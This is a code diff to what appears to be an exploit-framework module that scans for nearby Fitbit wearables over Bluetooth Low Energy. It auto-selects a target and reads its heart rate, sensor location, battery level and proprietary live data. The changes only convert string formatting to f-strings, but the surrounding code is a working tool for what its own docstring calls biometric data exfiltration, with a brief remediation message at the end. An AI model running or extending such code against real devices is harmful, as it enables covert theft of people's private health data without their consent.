@@ -131,7 +131,7 @@ class Exploit(Exploit):
             sock.send(disable)
             sock.close()
         except (OSError, PermissionError) as exc:
-            print_error("BLE scan error: {}".format(exc))
+            print_error(f"BLE scan error: {exc}")
         return list(devices.values())
 
     def _parse_fitbit_adv(self, pkt):
@@ -147,7 +147,7 @@ class Exploit(Exploit):
             return None
         try:
             addr_bytes = pkt[7:13] if len(pkt) > 13 else pkt[3:9]
-            bdaddr = ":".join("{:02X}".format(b) for b in reversed(addr_bytes))
+            bdaddr = ":".join(f"{b:02X}" for b in reversed(addr_bytes))
             name = ""
             is_fitbit = False
 
@@ -271,9 +271,7 @@ class Exploit(Exploit):
     def run(self):
         """Execute Fitbit BLE biometric data exfiltration."""
         print_status("Fitbit BLE Biometric Exfiltration")
-        print_info("Adapter: {} | Scan: {} sec".format(
-            self.adapter, self.scan_duration
-        ))
+        print_info(f"Adapter: {self.adapter} | Scan: {self.scan_duration} sec")
 
         devices = self._scan_for_fitbit()
         if devices:
@@ -286,13 +284,13 @@ class Exploit(Exploit):
 
         if not self.target_bdaddr and devices:
             self.target_bdaddr = devices[0]["bdaddr"]
-            print_info("Auto-selected target: {}".format(self.target_bdaddr))
+            print_info(f"Auto-selected target: {self.target_bdaddr}")
 
         if not self.target_bdaddr:
             print_error("No target BLE address specified")
             return
 
-        print_status("Target: {}".format(self.target_bdaddr))
+        print_status(f"Target: {self.target_bdaddr}")
 
         print_status("Reading Device Information Service...")
         dev_info = self._read_device_info(self.target_bdaddr)
@@ -309,19 +307,19 @@ class Exploit(Exploit):
             hr_data = self._parse_hr_measurement(hr_raw)
             print_success("Heart rate data retrieved:")
             for k, v in hr_data.items():
-                print_info("  {}: {}".format(k, v))
+                print_info(f"  {k}: {v}")
         else:
             print_warning("Heart rate not readable (may require notification mode)")
 
         body_loc = self._gatt_read(self.target_bdaddr, self._HR_BODY_SENSOR_LOC)
         if body_loc and len(body_loc) >= 1:
             loc_name = self._SENSOR_LOCATIONS.get(body_loc[0], "Unknown")
-            print_info("Sensor location: {} ({})".format(loc_name, body_loc[0]))
+            print_info(f"Sensor location: {loc_name} ({body_loc[0]})")
 
         print_status("Reading battery level...")
         bat_raw = self._gatt_read(self.target_bdaddr, self._BATTERY_LEVEL_CHAR)
         if bat_raw and len(bat_raw) >= 1:
-            print_success("Battery level: {}%".format(bat_raw[0]))
+            print_success(f"Battery level: {bat_raw[0]}%")
         else:
             print_warning("Battery level not accessible")
 
@@ -330,12 +328,12 @@ class Exploit(Exploit):
         if live_raw:
             print_success("Fitbit live data ({} bytes): {}".format(
                 len(live_raw),
-                " ".join("{:02X}".format(b) for b in live_raw[:32])
+                " ".join(f"{b:02X}" for b in live_raw[:32])
             ))
         else:
             print_info("Fitbit proprietary service not accessible (may require pairing)")
 
-        print_success("Exfiltration complete for {}".format(self.target_bdaddr))
+        print_success(f"Exfiltration complete for {self.target_bdaddr}")
         print_warning(
             "Remediation: keep Fitbit firmware updated, disable BLE when "
             "not syncing, and use a strong Fitbit account PIN."
